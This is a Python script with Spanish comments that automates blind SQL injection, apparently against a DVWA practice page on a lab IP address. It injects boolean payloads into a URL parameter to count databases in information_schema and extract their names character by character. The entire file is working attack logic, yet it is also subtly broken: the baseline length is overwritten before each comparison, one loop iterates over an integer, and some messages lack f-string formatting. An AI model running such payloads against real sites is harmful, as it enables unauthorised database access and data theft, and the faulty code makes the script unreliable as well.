import requests


def sacarNumTablas(url):
    indice = url.find("*")
    payload = "1'+and+(select+count(schema_name)+from+information_schema.schemata)%3d@+--+-"
    if indice == -1:
        raise ValueError("No se encontro el asterisco (*) en la cadena base.")
    
    try:
        respuesta = requests.get(url)
        respuesta.raise_for_status()
        LongitudDeError=len(respuesta.content)
        print(LongitudDeError)
    except requests.exceptions.HTTPError:
        print(f"Error al obtener la pagina web: {url}")
    
    urlTrucado = url.replace("*", payload)
    print(urlTrucado)
    numeroABuscar=int(input("Introduzca el numero de busquedas de bases de datos: "))
    for i in range (numeroABuscar):
        num = str(i)
        urlBuscado = urlTrucado.replace("@", num)
        print(urlBuscado)
        try:
            respuesta = requests.get(urlBuscado)
            respuesta.raise_for_status()
            LongitudDeError=len(respuesta.content)
            print(LongitudDeError)
            if((len(respuesta.content)) != LongitudDeError):
               print("El numero de la base de datos es: {i}")
               return i
        except requests.exceptions.HTTPError:
            print(f"Error al obtener la pagina web: {url}")

    return 1


#####################################################################################################

def SacarLargoNombre(numBase, url):
    print("sacar nombre")
    payload = "1' and (select length(schema_name) from information_schema.schemata limit ^,1)=@ -- -"
    payloadPersonalizado = payload.replace("^", str(numBase))
    
    try:
        respuesta = requests.get(url)
        respuesta.raise_for_status()
        LongitudDeError=len(respuesta.content)
        print(LongitudDeError)
    except requests.exceptions.HTTPError:
        print(f"Error al obtener la pagina web: {url}")
    
    urlTrucado = url.replace("*", payloadPersonalizado)
    print(urlTrucado)
    numeroABuscarLargoNombre=int(input("Introduzca el numero de largo del nombre: "))
    for i in range (numeroABuscarLargoNombre):
        num = str(i)
        urlBuscado = urlTrucado.replace("@", num)
        print(urlBuscado)
        try:
            respuesta = requests.get(urlBuscado)
            respuesta.raise_for_status()
            LongitudDeError=len(respuesta.content)
            print(LongitudDeError)
            if((len(respuesta.content)) != LongitudDeError):
               print("El nombre de la tabla contiene este numero de letras: {i}")
               return i
        except requests.exceptions.HTTPError:
            print(f"Error al obtener la pagina web: {url}")
    return 1


##################################################################################################### POR TERMINAR

def sacarNombre(longitudNombreTabla, url, numTabla):

    try:
        respuesta = requests.get(url)
        respuesta.raise_for_status()
        LongitudDeError=len(respuesta.content)
        print(LongitudDeError)
    except requests.exceptions.HTTPError:
        print(f"Error al obtener la pagina web: {url}")

    payload = "1' and substring((select schema_name from information_schema.schemata limit ^,1),@,1)='/' -- -"
    payloadPers = payload.replace("^" ,str(numTabla))
    nombreTabla = ""
    for i in range (longitudNombreTabla):
        payloadPersNum= payloadPers.replace("@", str(i))
        for j in (128):
            payloadPersNumLetra = payloadPersNum.replace("/", chr(j))
            urlBuscado = url.replace("*", payloadPersNumLetra)
            try:
                respuesta = requests.get(urlBuscado)
                respuesta.raise_for_status()
                LongitudDeError=len(respuesta.content)
                print(LongitudDeError)
                if((len(respuesta.content)) != LongitudDeError):
                    nombreTabla+=chr(j)
                    print(nombreTabla)
            except requests.exceptions.HTTPError:
                print(f"Error al obtener la pagina web: {url}")
    print("El nombre de la tabla es: {nombreTabla}")




#####################################################################################################
print("Hola mundo")
url = "http://10.0.2.20/vulnerabilities/sqli_blind/?id=*&Submit=Submit#"
numeroBaseDeDatos=sacarNumTablas(url)
#for i in range(numeroBaseDeDatos):
 #   longitudNombreTabla = SacarLargoNombre(i, url)
  #  sacarNombre(longitudNombreTabla, url, i)


